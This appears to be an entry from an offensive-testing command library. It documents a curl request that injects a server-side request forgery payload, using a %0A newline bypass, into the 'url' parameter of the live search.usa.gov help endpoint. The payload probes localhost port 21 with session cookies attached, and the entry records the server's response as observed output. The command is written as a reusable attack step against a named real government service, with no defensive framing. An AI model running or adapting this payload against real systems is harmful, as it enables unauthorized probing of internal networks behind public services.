---
id: cmd-ssrf-21
data: >-
  curl -X GET
  "https://search.usa.gov/help_docs?url=http://127.0.0.1:21/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html"
  -H "Host: search.usa.gov" -H "Cookie: [session_cookies]"
tags:
  - ssrf
  - scan
type: command
output: >-
  HTTP/1.1 200 OK ~450ms with error: 'Unable to retrieve
  http://127.0.0.1:21/?\nhttps://search.gov/manual/account.html'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.657Z'
verified: false
validated: true
submitted: true
---
# ssrf-localhost-21-test

## Command

```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://127.0.0.1:21/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" -H "Host: search.usa.gov" -H "Cookie: [session_cookies]"
```

## Description

Injects SSRF payload targeting closed localhost port 21 using %0A bypass to test vulnerability and observe quick failure response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url=...` | Injected URL with %0A | Yes |
| `-H "Cookie: ..."` | Auth cookies | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://127.0.0.1:21/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" [headers]
```

## Expected Output

200 OK in ~450ms with error body indicating failed retrieval of injected URL.

## Related

- [[commands/help-docs-normal-get]]
- [[procedures/Test-SSRF-Bypass-on-Closed-Port]]
